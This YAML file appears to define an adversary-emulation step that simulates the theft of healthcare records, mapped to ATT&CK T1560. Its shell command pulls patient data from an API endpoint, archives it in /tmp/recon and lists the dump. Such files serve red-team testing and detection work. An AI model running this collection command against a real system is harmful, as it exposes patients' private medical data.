- id: "collection-dump-db"
  name: "Dump Healthcare Database"
  description: "Exfiltrates sensitive healthcare data by dumping the database contents."
  tactic: "collection"
  technique:
    attack_id: "T1560"
    name: "Archive Collected Data"
  platforms:
    linux:
      sh:
        command: |
          OUTDIR=/tmp/recon
          mkdir -p $OUTDIR
          TIMESTAMP=$(date +%Y%m%d_%H%M%S)
          curl -s http://api:8000/patients -o $OUTDIR/db_raw_$TIMESTAMP.json
          # Crea anche un archivio compresso (realizza davvero T1560)
          tar czf $OUTDIR/db_dump_$TIMESTAMP.tar.gz -C $OUTDIR db_raw_$TIMESTAMP.json
          echo "Dump saved to $OUTDIR/db_dump_$TIMESTAMP.tar.gz"
          ls -lh $OUTDIR/